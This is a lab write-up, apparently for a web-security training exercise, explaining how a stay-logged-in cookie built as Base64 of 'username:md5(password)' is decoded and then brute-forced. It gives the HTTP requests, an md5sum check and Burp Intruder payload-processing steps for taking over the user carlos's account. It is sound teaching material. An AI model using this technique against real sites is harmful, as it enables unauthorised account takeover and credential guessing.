# Lab: Brute-forcing a stay-logged-in cookie
## Description
Goal: This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing. Brute-force Carlos's cookie to gain access to his "My account" page.

1. By authenticating as `wiener` and enabling the `Stay logged-in` the following request/response happens:
```yaml
POST /login HTTP/1.1
Host: ac8d1f981fb72c48c1a50226001400a2.web-security-academy.net
Cookie: session=02Dz1frodI1DLaCklWL1I7FQKN7PuQyZ

username=wiener&password=peter&stay-logged-in=on


HTTP/1.1 302 Found
Location: /my-account
Set-Cookie: session=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; Secure; HttpOnly; SameSite=None
```

2. When authenticating again, with `Stay logged in` disabled, the following is returned:
```yaml
HTTP/1.1 302 Found
Location: /my-account
Set-Cookie: session=Au8UVJuiZtQ8DlVQeZBND0Dyvn8HgJvA; Secure; HttpOnly; SameSite=None


```
3. Notice the difference? The `stay-logged-in` cookie is much longer and turned out to be Base64 encoded. Decoding (`d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`) will show up as `wiener:51dc30ddc473d43a6011e9ebba6ca770`
4. The latter part of the string is 32 characters long and could look like an md5. But of what? Well, turns out, its an md5 checksum of the user's password:
```bash
$ echo -n peter | md5sum
51dc30ddc473d43a6011e9ebba6ca770  -
```
5. With this, we can start brute forcing Carlos' password. First we take a password e.g. (`123456`) then we must convert it to a md5 checksum (`e10adc3949ba59abbe56e057f20f883e`) and finally take `carlos:e10adc3949ba59abbe56e057f20f883e` and base64 encode it (`Y2FybG9zOmUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNl`). 

## Solution
1. Open Burp Intruder, and provide the following payload, and configure it to use `Sniper` attack.
```yaml
GET /my-account HTTP/1.1
Host: ac8d1f981fb72c48c1a50226001400a2.web-security-academy.net
Cookie: stay-logged-in=§d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw§;

```
2. Use a `Simple list` payload type, and paste in the [passwords](../passwords.lst)
3. Configure Payload Processing.
	* Click Add and choose `Hash` and `MD5`
	* Click Add and choose `Add prefix` and type in `carlos:`
	* Click Add and choose `Encode` and `Base64-encode`
4. Start Burp Intruder attack and look for a response with `200 OK`

